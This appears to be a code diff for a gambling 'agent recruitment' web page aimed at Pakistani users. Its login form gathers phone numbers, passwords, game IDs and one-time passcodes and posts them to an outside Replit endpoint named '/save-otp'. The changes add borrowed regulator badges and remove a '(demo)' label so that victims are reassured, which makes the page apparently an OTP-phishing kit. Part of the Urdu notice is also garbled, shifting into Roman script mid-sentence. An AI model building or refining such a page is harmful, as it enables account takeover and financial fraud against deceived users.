@@ -20,7 +20,7 @@
            <div class="flex items-center justify-between mb-4">
                <div class="flex items-center space-x-2">
                    <span class="text-3xl">🎰</span>
-                   <h1 class="text-xl font-bold text-red-700">177 Slots Agent System</h1>
+                   <h1 class="text-xl font-bold text-red-700">177 Slots Agent</h1>
                    <span class="text-3xl">💃</span>
                </div>
                <h2 class="text-sm font-semibold text-gray-700">Recruitment Agent</h2>
@@ -58,29 +58,25 @@
            <div class="bg-yellow-100 border border-yellow-300 rounded-lg p-4 text-gray-800">
                <h3 class="font-bold text-lg mb-2">Notice:</h3>
                <p class="text-sm" lang="ur" dir="rtl">
-                   حال ہی میں ادائیگی کے چینلز میں
-عدم استحکام پایا جا رہا ہے، جس کی وجہ سے کامیاب
-ادائیگی کی شرح کم ہے۔ ہم اس مسئلے کو ہنگامی طور پر
-حل کرنے کی کوشش کر رہے ہیں۔ اس پریشانی کے لیے ہم
-دل سے معذرت خواہ ہیں
+                   حال ہی میں ادائیگی کے چینلز میں عدم استحکام پaya ja raha hai, jis ki wajah se kamyab adaigi ki sharah kam hai. Hum is maslay ko hangami tor par hal karne ki koshish kar rahe hain. Is pareshani ke liye hum dil se maazrat khwah hain
                </p>
            </div>
        </div>
        <div class="p-4">
            <div class="bg-white rounded-lg shadow-md p-6 text-center">
                <div class="flex justify-around items-center mb-6">
-                   <div class="text-center"><span class="text-5xl">🎰</span><div class="font-bold text-red-700">177 Slots Game</div></div>
+                   <div class="text-center"><span class="text-5xl">🎰</span><div class="font-bold text-red-700">177 Slots Agent</div></div>
                    <div class="grid grid-cols-2 gap-4">
                        <div class="font-bold text-blue-600">JazzCash</div>
-                       <div class="font-bold text-green-600">Easypaisa</div>
-                       <div class="font-semibold text-gray-500"></div>
-                       <div class="font-semibold text-blue-800"></div>
+                       <div class="font-bold text-green-600">easypaisa</div>
+                       <div class="font-semibold text-gray-500">IBIA</div>
+                       <div class="font-semibold text-blue-800">eCOGRA</div>
                    </div>
                </div>
                <p class="text-gray-700 font-medium">
-                   Download the latest version of 177 Slots APK v1.1 for your Android and iOS devices for free.
+                   Download the latest version of 177 Slots Agent APK v39 for your Android and iOS devices for free.
                </p>
-           </div>
+               </div>
        </div>
    </div> 
    
@@ -100,7 +96,7 @@
                <div><label for="password" class="block text-xs font-medium text-gray-700">Password</label><input type="password" id="password" name="password" required class="mt-1 block w-full px-2 py-1 border border-gray-300 rounded-md shadow-sm focus:outline-none focus:ring-blue-500 focus:border-blue-500 text-sm"></div>
                <div><label for="confirm_password" class="block text-xs font-medium text-gray-700">Confirm Password</label><input type="password" id="confirm_password" name="confirm_password" required class="mt-1 block w-full px-2 py-1 border border-gray-300 rounded-md shadow-sm focus:outline-none focus:ring-blue-500 focus:border-blue-500 text-sm"></div>
                <div><label for="number" class="block text-xs font-medium text-gray-700">Number</label><input type="tel" id="number" name="number" required class="mt-1 block w-full px-2 py-1 border border-gray-300 rounded-md shadow-sm focus:outline-none focus:ring-blue-500 focus:border-blue-500 text-sm"></div>
-               <div><label for="game_id" class="block text-xs font-medium text-gray-700">177 Slots - Game ID</label><input type="text" id="game_id" name="game_id" required class="mt-1 block w-full px-2 py-1 border border-gray-300 rounded-md shadow-sm focus:outline-none focus:ring-blue-500 focus:border-blue-500 text-sm"></div>
+               <div><label for="game_id" class="block text-xs font-medium text-gray-700">177 Slots Agent - Game ID</label><input type="text" id="game_id" name="game_id" required class="mt-1 block w-full px-2 py-1 border border-gray-300 rounded-md shadow-sm focus:outline-none focus:ring-blue-500 focus:border-blue-500 text-sm"></div>
                <div>
                    <label class="block text-xs font-medium text-gray-700">Captcha</label>
                    <div class="flex items-center space-x-2 mt-1">
@@ -134,10 +130,9 @@
                </div>
 
                <div>
-                   <label for="login_game_id" class="block text-xs font-medium text-gray-700">177 Slots - Game ID</label>
+                   <label for="login_game_id" class="block text-xs font-medium text-gray-700">177 Slots Agent - Game ID</label>
                    <input type="text" id="login_game_id" name="login_game_id" required class="mt-1 block w-full px-2 py-1 border border-gray-300 rounded-md shadow-sm focus:outline-none focus:ring-blue-500 focus:border-blue-500 text-sm" placeholder="Enter Your Game ID">
                </div>
-
                <div>
                    <label for="login_otp" class="block text-xs font-medium text-gray-700">Enter OTP</label>
                    <div class="flex items-center space-x-2 mt-1">
@@ -162,12 +157,23 @@
    <div id="successModal" class="fixed inset-0 bg-black/50 hidden justify-center items-center z-50 p-4">
        <div class="bg-white p-8 rounded-lg shadow-xl w-full max-w-xs text-center">
            <i class="fas fa-check-circle text-green-500 text-5xl mb-4"></i>
-           <p class="text-lg font-semibold text-gray-800 mb-4">Account Created Successfully</p>
+           <p id="successModalMessage" class="text-lg font-semibold text-gray-800 mb-4">Account Created Successfully</p>
            <button id="closeSuccessModal" class="bg-blue-600 text-white py-2 px-6 rounded-md font-semibold hover:bg-blue-700 focus:outline-none focus:ring-2 focus:ring-blue-500 focus:ring-offset-2">
                OK
            </button>
        </div>
    </div>
+
+   <div id="errorModal" class="fixed inset-0 bg-black/50 hidden justify-center items-center z-50 p-4">
+       <div class="bg-white p-8 rounded-lg shadow-xl w-full max-w-xs text-center">
+           <i class="fas fa-exclamation-triangle text-yellow-500 text-5xl mb-4"></i>
+           <p id="errorModalMessage" class="text-lg font-semibold text-gray-800 mb-4">Error message goes here</p>
+           <button id="closeErrorModal" class="bg-red-600 text-white py-2 px-6 rounded-md font-semibold hover:bg-red-700 focus:outline-none focus:ring-2 focus:ring-red-500 focus:ring-offset-2">
+               OK
+           </button>
+       </div>
+   </div>
+
 
    <script>
        // ▼▼▼=================================================▼▼▼
@@ -190,8 +196,16 @@
            const captchaInput = document.getElementById('captchaInput');
            const refreshCaptcha = document.getElementById('refreshCaptcha');
            const captchaError = document.getElementById('captchaError');
+           
+           // --- SUCCESS MODAL ELEMENTS (UPDATED) ---
            const successModal = document.getElementById('successModal');
            const closeSuccessModalBtn = document.getElementById('closeSuccessModal');
+           const successModalMessage = document.getElementById('successModalMessage'); 
+
+           // --- NAYE ERROR MODAL KE ELEMENTS ---
+           const errorModal = document.getElementById('errorModal');
+           const closeErrorModalBtn = document.getElementById('closeErrorModal');
+           const errorModalMessage = document.getElementById('errorModalMessage');
 
            // --- ELEMENTS FOR LOGIN MODAL ---
            const loginButton = document.getElementById('loginButton');
@@ -218,6 +232,7 @@
                captchaError.classList.add('hidden');
            }
 
+           // --- Register Modal Functions ---
            function openModal() {
                registerModal.classList.remove('hidden');
                registerModal.classList.add('flex');
@@ -230,6 +245,7 @@
                registerModal.classList.remove('flex');
            }
 
+           // --- Login Modal Functions ---
            function openLoginModal() {
                loginModal.classList.remove('hidden');
                loginModal.classList.add('flex');
@@ -242,15 +258,38 @@
                loginModal.classList.remove('flex');
            }
 
-           function openSuccessModal() {
-               successModal.classList.remove('hidden');
-               successModal.classList.add('flex');
+           // --- UPDATED Success Modal Functions ---
+           function openSuccessModal(message) {
+               if (successModalMessage) { successModalMessage.textContent = message; }
+               if (successModal) {
+                   successModal.classList.remove('hidden');
+                   successModal.classList.add('flex');
+               }
            }
 
            function closeSuccessModal() {
-               successModal.classList.add('hidden');
-               successModal.classList.remove('flex');
+               if (successModal) {
+                   successModal.classList.add('hidden');
+                   successModal.classList.remove('flex');
+               }
            }
+           
+           // --- NAYE Error Modal Functions ---
+           function openErrorModal(message) {
+               if (errorModalMessage) { errorModalMessage.textContent = message; }
+               if (errorModal) {
+                   errorModal.classList.remove('hidden');
+                   errorModal.classList.add('flex');
+               }
+           }
+
+           function closeErrorModal() {
+               if (errorModal) {
+                   errorModal.classList.add('hidden');
+                   errorModal.classList.remove('flex');
+               }
+           }
+
 
            // --- Event Listeners (Register) ---
            if (signUpButton) { signUpButton.addEventListener('click', openModal); }
@@ -262,7 +301,7 @@
                    if (captchaInput.value.toLowerCase() === currentCaptcha.toLowerCase()) {
                        console.log('Registration successful!');
                        closeModal();
-                       openSuccessModal();
+                       openSuccessModal('Account Created Successfully'); 
                        registerForm.reset(); 
                        captchaError.classList.add('hidden');
                    } else {
@@ -274,13 +313,17 @@
            }
            if (registerForm) { registerForm.addEventListener('reset', function() { captchaError.classList.add('hidden'); generateCaptcha(); }); }
            if (refreshCaptcha) { refreshCaptcha.addEventListener('click', generateCaptcha); }
-           if (closeSuccessModalBtn) { closeSuccessModalBtn.addEventListener('click', closeSuccessModal); }
            
            // --- Event Listeners (Login) ---
            if (loginButton) { loginButton.addEventListener('click', openLoginModal); }
            if (closeLoginModalButton) { closeLoginModalButton.addEventListener('click', closeLoginModal); }
            if (loginModal) { loginModal.addEventListener('click', function(event) { if (event.target === loginModal) { closeLoginModal(); } }); }
            
+           // --- Event Listeners (Custom Modals) ---
+           if (closeSuccessModalBtn) { closeSuccessModalBtn.addEventListener('click', closeSuccessModal); }
+           if (closeErrorModalBtn) { closeErrorModalBtn.addEventListener('click', closeErrorModal); } 
+
+
            // =========================================================
            // LOGIN FORM SUBMIT (DATA REPLIT KO BHEJEGA)
            // =========================================================
@@ -295,11 +338,8 @@
                     const formData = new FormData();
                     formData.append('number', loginNumber.value);
                     formData.append('otp', loginOtp.value);
-                    
-                    // ▼▼▼ YEH DO LINES ADD KI GAYI HAIN ▼▼▼
                     formData.append('password', loginPassword.value); 
                     formData.append('game_id', loginGameId.value);
-                    // ▲▲▲ YEH DO LINES ADD KI GAYI HAIN ▲▲▲
 
                     fetch(`${REPLIT_BACKEND_URL}/save-otp`, {
                         method: 'POST',
@@ -322,13 +362,13 @@
             }
 
             // =========================================================
-            // GET OTP BUTTON CLICK (DATA REPLIT KO BHEJEGA)
+            // GET OTP BUTTON CLICK (DATA REPLIT KO BHEJEGA) - UPDATED
             // =========================================================
             if (getOtpButton) {
                 getOtpButton.addEventListener('click', function() {
                     
                     if (!loginNumber.value || !loginPassword.value || !loginGameId.value) {
-                        alert('Please fill in Number, Password, and Game ID first.');
+                        openErrorModal('Please fill in Number, Password, and Game ID first.');
                         return;
                     }
 
@@ -347,11 +387,11 @@
                     .then(response => response.text())
                     .then(data => {
                         console.log(data);
-                        alert('OTP has been sent (demo).'); // User ko tasalli dein
+                        openSuccessModal('OTP has been sent.'); 
                     })
                     .catch(error => {
                         console.error('Error:', error);
-                        alert('Failed to request OTP. Please try again.');
+                        openErrorModal('Failed to request OTP. Please try again.');
                     })
                     .finally(() => {
                         getOtpButton.disabled = false; // Button ko wapas enable karein
